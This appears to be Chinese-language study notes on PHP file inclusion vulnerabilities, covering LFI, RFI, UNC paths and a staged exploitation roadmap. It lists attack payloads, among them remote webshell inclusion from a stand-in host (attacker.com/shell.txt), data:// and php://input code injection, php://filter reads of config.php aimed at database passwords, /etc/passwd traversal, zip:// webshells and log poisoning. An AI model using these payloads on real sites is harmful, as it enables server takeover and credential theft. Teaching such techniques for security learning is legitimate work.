文件包含漏洞

一、核心原理

文件包含漏洞本质：

通俗来说，其实就是程序员在 web 开发时候使用了include()这样的函数去加载资源，在实际使用的时候由用户传入参数，但是没有对参数进行校验、过滤，直接使用用户传入的参数，导致被传入恶意参数，一般可能伴随目录穿越的风险

举个例子：

正常逻辑：你去图书馆借书，只允许你借阅文学区的书，管理员问你要什么书？你说：《西游记》，管理员判断你的要求符合规则，于是就去文学区找出来给你

错误逻辑：管理员没有对读者的要求进行校验，说什么就执行什么，于是你突发奇想说：我要文学区/../../密码箱/图书馆密码,然后管理员就真的照做了

二、远程文件包含（RFI）

实际上就是可以访问其他服务器上的文件，比如你在京东的网站上（假设有文件包含漏洞）去访问淘宝上的图片，或者去访问你提前部署在自己电脑上的木马文件

示例

shell.txt：

由于在访问时服务器会以php形式解析文件（include()函数特性，会解析php代码），所以你相当于成功写入webshell

验证方法

  1. 替换为自己服务器
  2. 用 Burp / DNSLog 看是否有请求

UNC路径

严格来说利用UNC路径也是远程文件包含的一种方式，但两者存在本质上的区别

  • 远程文件包含（RFI） 需要php配置开启allow_url_fopen（允许访问远程文件），而UNC 本质上属于本地文件系统，不受php配置影响
  • 远程文件包含（RFI） 使用的是HTTP/HTTPS（80/443端口） 协议，在日志中很扎眼，而UNC 使用的是SMB（445端口） 协议，只有禁用了445端口才能拦截

三、本地文件包含（LFI）

访问服务器本地的文件，一样的道理，只是利用手段更多

用途：

  • 读配置
  • 读源码
  • 配合日志投毒RCE（后面会提到）

2. php://filter

用来单纯读取文件，不解析

刚刚说到如果后端使用了类似 include() 去包含文件，那文件会被解析，有时候我们只需要读取文件内容而不希望解析，比如说 .php文件，所以filter的思路就是先将文件转换成base64编码，这样就不会被解析，只会被展示在前端，再利用工具将展示出来的base编码转回原文

3. php://input

原理是input可以拿到原始数据

用 echo file_get_contents(“php://input”); 看到的还是

漏洞利用思路总结

第一阶段：信息收集与探测

在动手之前，首先要确认漏洞的存在及其环境限制。

寻找参数： 留意 URL 或 POST 请求中类似 ?page=, ?file=, ?home= 的参数。

确认读取能力： 尝试读取简单文件，如 ?file=…/…/…/…/etc/passwd (Linux) 或 C:\Windows\win.ini (Windows)。

探测 PHP 配置： 通过 phpinfo() 查看 allow_url_fopen 和 allow_url_include 的开启状态。

测试是否支持伪协议 （如 php://filter）

第二阶段：根据环境选择攻击路径

按照由易到难的顺序，攻击者通常会尝试以下几种思路：

思路 A： 直接代码注入（最快，需开启远程包含）

如果 allow_url_include = On， 这是首选方案：

远程文件包含 (RFI)： 直接加载远程木马 ?file=http://attacker.com/shell.txt

Data 协议： 直接把代码写在 URL 里 ?file=data://text/plain;base64,PD9waH…

Input 协议： 将代码放在 POST Body 中 ?file=php://input

思路 B： 读取敏感源码（扩大战果）

如果无法执行代码，先偷取配置文件：

Filter 协议： 利用 php://filter 读取加密后的源码。

?file=php://filter/read=convert.base64-encode/resource=config.php

目的： 获取数据库密码、其他 API 密钥，寻找下一个突破口。

思路 C： 本地文件配合（绕过远程限制）

如果只能包含本地文件（LFI），则需要寻找服务器上可控内容的文件：

配合文件上传： 上传一个内容为 PHP 代码的 JPG 或 TXT，然后包含它。

Zip/Phar 协议： 上传压缩包伪装的图片，包含内部木马 ?file=zip://uploads/img.zip%23shell.php

思路 D： 日志投毒（最后的杀手锏）

如果没有上传点，就利用系统产生的日志：

日志投毒： 往 User-Agent 或 URL 里塞木马，包含 access.log
